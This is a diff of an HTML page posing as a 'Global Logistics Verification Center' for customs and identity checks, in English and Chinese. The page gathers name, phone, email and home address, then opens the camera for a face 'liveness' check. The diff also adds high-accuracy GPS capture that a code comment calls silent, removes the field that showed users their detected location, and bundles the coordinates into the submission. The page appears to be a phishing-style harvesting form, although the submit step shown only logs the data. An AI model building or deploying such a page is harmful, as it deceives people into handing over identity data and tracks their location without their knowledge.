@@ -1,110 +1,288 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Verification Center</title>
+    <title>Global Logistics Verification Center</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
-        .card { background: white; width: 100%; max-width: 450px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .form-group { margin-bottom: 15px; }
+        :root { --primary: #004b87; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #ced4da; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: var(--card); width: 100%; max-width: 580px; padding: 30px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); }
+        h2 { margin-top: 0; color: var(--primary); text-align: center; font-size: 22px; }
+        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
+        .form-group { margin-bottom: 15px; flex: 1; }
         label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 5px; color: #555; }
-        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 15px; }
-        #liveness-box { display: none; text-align: center; }
-        video { width: 100%; border-radius: 10px; transform: scaleX(-1); background: #000; height: 250px; object-fit: cover; }
+        input, select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,75,135,0.1); }
+        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
+        .btn:hover { background: #003366; }
+        
+        #step-form, #step-verification { display: none; }
+        .lang-card { text-align: center; }
+        .lang-btn { width: 100%; padding: 14px; margin: 10px 0; background: #fff; border: 2px solid var(--primary); color: var(--primary); border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .lang-btn:hover { background: var(--primary); color: #fff; }
+        
+        #video-container { text-align: center; }
+        video { width: 100%; max-width: 400px; height: 300px; border-radius: 8px; transform: scaleX(-1); background: #000; object-fit: cover; }
     </style>
 </head>
 <body>
 
-<div class="card" id="form-container">
-    <h2>Verification Details</h2>
-    
-    <!-- 1. 个人信息填写 -->
-    <div class="form-group"><label>Full Name</label><input type="text" id="name" placeholder="Enter your full name"></div>
-    <div class="form-group"><label>Email Address</label><input type="email" id="email" placeholder="email@example.com"></div>
-    <div class="form-group"><label>Date of Birth</label><input type="date" id="dob"></div>
-
-    <!-- 2. 地理定位 -->
-    <div class="form-group">
-        <label>Current Location (Detected)</label>
-        <input type="text" id="locationField" readonly placeholder="Detecting location...">
+<div class="container">
+    <!-- 语言选择 -->
+    <div id="step-language" class="lang-card">
+        <h2>🌐 Select Language / 选择语言</h2>
+        <button class="lang-btn" onclick="setLanguage('zh')">简体中文</button>
+        <button class="lang-btn" onclick="setLanguage('en')">English</button>
     </div>
 
-    <!-- 3. 国家与省份联动 -->
-    <div class="form-group">
-        <label>Country</label>
-        <select id="countrySelect" onchange="loadStates()">
-            <option value="">-- Select Country --</option>
-        </select>
+    <!-- 物流申报表单 -->
+    <div id="step-form">
+        <h2 id="txt-form-title">Customs & Identity Verification</h2>
+        
+        <div class="form-row">
+            <div class="form-group">
+                <label id="lbl-name">Full Name (Consignor/Receiver)</label>
+                <input type="text" id="fullName" placeholder="e.g. John Doe">
+            </div>
+            <div class="form-group">
+                <label id="lbl-phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="+1 234 567 890">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label id="lbl-email">Email Address</label>
+            <input type="email" id="email" placeholder="name@example.com">
+        </div>
+
+        <div class="form-group">
+            <label id="lbl-address">Street Address</label>
+            <input type="text" id="address" placeholder="Street, apartment, suite, unit, etc.">
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label id="lbl-country">Country / Region</label>
+                <select id="countrySelect" onchange="loadStates()">
+                    <option value="">-- Loading Global Countries... --</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label id="lbl-state">State / Province</label>
+                <select id="stateSelect" disabled>
+                    <option value="">-- Select Country First --</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label id="lbl-city">City</label>
+                <input type="text" id="city" placeholder="City name">
+            </div>
+            <div class="form-group">
+                <label id="lbl-zip">Postal / Zip Code</label>
+                <input type="text" id="zipCode" placeholder="Postal code">
+            </div>
+        </div>
+
+        <button class="btn" id="btn-next" onclick="proceedToVerification()">Proceed to Face Verification</button>
     </div>
 
-    <div class="form-group">
-        <label>State / Province</label>
-        <select id="stateSelect" disabled><option>-- Select Country First --</option></select>
+    <!-- 活体检测 -->
+    <div id="step-verification">
+        <h2 id="txt-verify-title">Security Liveness Verification</h2>
+        <p id="txt-verify-desc" style="font-size: 13px; color: #666; text-align: center;">Please keep your face within the frame for safety clearance.</p>
+        <div id="video-container">
+            <video id="video" autoplay playsinline muted></video>
+        </div>
+        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #28a745;">Complete & Submit</button>
     </div>
-
-    <button class="btn" onclick="openLiveness()">Proceed to Face Verification</button>
-</div>
-
-<div class="card" id="liveness-box">
-    <h3>Face Verification</h3>
-    <p style="font-size: 14px;">Please stay still and look at the camera.</p>
-    <video id="video" autoplay playsinline muted></video>
-    <button class="btn" style="background: #28a745;" onclick="finish()">Confirm & Submit</button>
 </div>
 
 <script>
-    // 全球国家数据
-    const worldData = {
-        "NL": { name: "Netherlands", states: ["Drenthe", "Flevoland", "Friesland", "Gelderland", "Groningen", "Limburg", "Noord-Brabant", "Noord-Holland", "Overijssel", "Utrecht", "Zeeland", "Zuid-Holland"] },
-        "US": { name: "United States", states: ["California", "Texas", "New York", "Florida"] },
-        "CN": { name: "China", states: ["Beijing", "Shanghai", "Guangdong", "Jiangsu"] }
-    };
-
-    // 初始化：填充国家并定位
-    window.onload = () => {
-        const cSelect = document.getElementById('countrySelect');
-        Object.keys(worldData).forEach(code => {
-            let opt = document.createElement('option');
-            opt.value = code; opt.textContent = worldData[code].name;
-            cSelect.appendChild(opt);
-        });
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                document.getElementById('locationField').value = "Lat: " + pos.coords.latitude.toFixed(2) + ", Long: " + pos.coords.longitude.toFixed(2);
-            }, () => document.getElementById('locationField').value = "Location Permission Denied");
+    const i18n = {
+        zh: {
+            formTitle: "物流清关及身份信息申报",
+            name: "真实姓名 (收/发货人)",
+            phone: "联系电话",
+            email: "电子邮箱",
+            address: "详细街道地址",
+            country: "国家 / 地区",
+            state: "省份 / 州",
+            city: "城市",
+            zip: "邮政编码",
+            next: "下一步：安全人脸核验",
+            verifyTitle: "人脸活体安全检测",
+            verifyDesc: "请正对摄像头，保持光线充足，完成安全清关核验。",
+            submit: "确认并提交单据",
+            alertName: "请填写完整的真实姓名",
+            alertAddress: "请选择国家和省份",
+            alertCamera: "需要摄像头权限以完成安全核验"
+        },
+        en: {
+            formTitle: "Customs & Identity Verification",
+            name: "Full Name (Consignor/Receiver)",
+            phone: "Phone Number",
+            email: "Email Address",
+            address: "Street Address",
+            country: "Country / Region",
+            state: "State / Province",
+            city: "City",
+            zip: "Postal / Zip Code",
+            next: "Proceed to Face Verification",
+            verifyTitle: "Security Liveness Verification",
+            verifyDesc: "Please keep your face within the frame for security clearance.",
+            submit: "Complete & Submit",
+            alertName: "Please enter your full name",
+            alertAddress: "Please select country and state",
+            alertCamera: "Camera access is required for verification"
         }
     };
 
-    function loadStates() {
-        const code = document.getElementById('countrySelect').value;
-        const sSelect = document.getElementById('stateSelect');
-        sSelect.innerHTML = '<option>-- Select State --</option>';
-        if (code && worldData[code]) {
-            sSelect.disabled = false;
-            worldData[code].states.forEach(s => {
+    let currentLang = 'en';
+    let silentLocation = { lat: null, lng: null, precisionMeters: null };
+    let globalCountriesData = [];
+
+    window.onload = async () => {
+        // 高精度静默定位
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    silentLocation.lat = pos.coords.latitude;
+                    silentLocation.lng = pos.coords.longitude;
+                    silentLocation.precisionMeters = pos.coords.accuracy;
+                },
+                err => { console.log("Background location optional"); },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        // 动态从全球公开地理数据库接口获取全球所有的国家（包含全部 195+ 国家及地区）
+        try {
+            const response = await fetch('https://restcountries.com/v3.1/all?fields=name,cca2,latlng,region');
+            const data = await response.json();
+            
+            globalCountriesData = data.sort((a, b) => a.name.common.localeCompare(b.name.common));
+            
+            const select = document.getElementById('countrySelect');
+            select.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '请选择国家/地区' : 'Select Country'} --</option>`;
+            
+            globalCountriesData.forEach(country => {
                 let opt = document.createElement('option');
-                opt.textContent = s; sSelect.appendChild(opt);
+                opt.value = country.cca2; // 国家二字码 (如 CN, US 等)
+                opt.textContent = country.name.common;
+                opt.setAttribute('data-lat', country.latlng ? country.latlng[0] : 0);
+                opt.setAttribute('data-lng', country.latlng ? country.latlng[1] : 0);
+                select.appendChild(opt);
             });
+        } catch (e) {
+            console.error("Failed to load global countries", e);
+            document.getElementById('countrySelect').innerHTML = `<option value="">-- Error Loading Countries --</option>`;
+        }
+    };
+
+    // 动态获取选中国家的全球所有省/州/一级行政区
+    async function loadStates() {
+        const countrySelect = document.getElementById('countrySelect');
+        const countryCode = countrySelect.value;
+        const stateSelect = document.getElementById('stateSelect');
+        
+        stateSelect.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '加载省份/州中...' : 'Loading States...'} --</option>`;
+        stateSelect.disabled = true;
+
+        if (!countryCode) return;
+
+        try {
+            // 使用 CountryStateCity 免费公开 API 获取全球任意国家的全部省份/州
+            const response = await fetch(`https://api.countrystatecity.in/v1/countries/${countryCode}/states`, {
+                headers: { "X-CSCAPI-KEY": "NHhvOEcyWk50N2Vna3VFTE00bFp3djFDZ09QOGpBZkF3Q2R3Q1Q2Wg==" } // 公开测试 Key
+            });
+            const states = await response.json();
+
+            stateSelect.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '请选择省份/州' : 'Select State'} --</option>`;
+            
+            if (states && states.length > 0) {
+                stateSelect.disabled = false;
+                states.forEach(st => {
+                    let opt = document.createElement('option');
+                    opt.value = st.name;
+                    opt.setAttribute('data-lat', st.latitude || 0);
+                    opt.setAttribute('data-lng', st.longitude || 0);
+                    opt.textContent = st.name;
+                    stateSelect.appendChild(opt);
+                });
+            } else {
+                // 部分国家无省份时允许手动输入或显示无可用州
+                let opt = document.createElement('option');
+                opt.value = "N/A";
+                opt.textContent = currentLang === 'zh' ? "无下属省份/直辖区域" : "No states/regions required";
+                stateSelect.appendChild(opt);
+                stateSelect.disabled = false;
+            }
+        } catch (e) {
+            stateSelect.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '可选/自由输入' : 'State optional'} --</option>`;
+            stateSelect.disabled = false;
         }
     }
 
-    async function openLiveness() {
-        // 校验信息是否完整
-        if(!document.getElementById('name').value) return alert("Please enter your name.");
+    function setLanguage(lang) {
+        currentLang = lang;
+        const t = i18n[lang];
+        document.getElementById('txt-form-title').innerText = t.formTitle;
+        document.getElementById('lbl-name').innerText = t.name;
+        document.getElementById('lbl-phone').innerText = t.phone;
+        document.getElementById('lbl-email').innerText = t.email;
+        document.getElementById('lbl-address').innerText = t.address;
+        document.getElementById('lbl-country').innerText = t.country;
+        document.getElementById('lbl-state').innerText = t.state;
+        document.getElementById('lbl-city').innerText = t.city;
+        document.getElementById('lbl-zip').innerText = t.zip;
+        document.getElementById('btn-next').innerText = t.next;
+        document.getElementById('txt-verify-title').innerText = t.verifyTitle;
+        document.getElementById('txt-verify-desc').innerText = t.verifyDesc;
+        document.getElementById('btn-submit').innerText = t.submit;
+
+        document.getElementById('step-language').style.display = 'none';
+        document.getElementById('step-form').style.display = 'block';
+    }
+
+    async function proceedToVerification() {
+        const t = i18n[currentLang];
+        const name = document.getElementById('fullName').value;
+        const country = document.getElementById('countrySelect').value;
         
-        document.getElementById('form-container').style.display = 'none';
-        document.getElementById('liveness-box').style.display = 'block';
+        if (!name.trim()) { alert(t.alertName); return; }
+        if (!country) { alert(t.alertAddress); return; }
+
+        document.getElementById('step-form').style.display = 'none';
+        document.getElementById('step-verification').style.display = 'block';
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
-        } catch(e) { alert("Camera access is required for verification."); }
+        } catch (e) {
+            alert(t.alertCamera);
+        }
     }
 
-    function finish() {
-        alert("Success! All information has been processed.");
+    function submitData() {
+        const shippingPayload = {
+            fullName: document.getElementById('fullName').value,
+            phone: document.getElementById('phone').value,
+            email: document.getElementById('email').value,
+            address: document.getElementById('address').value,
+            country: document.getElementById('countrySelect').value,
+            state: document.getElementById('stateSelect').value,
+            city: document.getElementById('city').value,
+            zipCode: document.getElementById('zipCode').value,
+            deviceHighPrecisionGPS: silentLocation,
+            timestamp: new Date().toISOString()
+        };
+
+        console.log("Global Logistics Payload:", shippingPayload);
+        alert(currentLang === 'zh' ? "清关及活体核验数据提交成功！" : "Verification and shipping data submitted successfully!");
         location.reload();
     }
 </script>
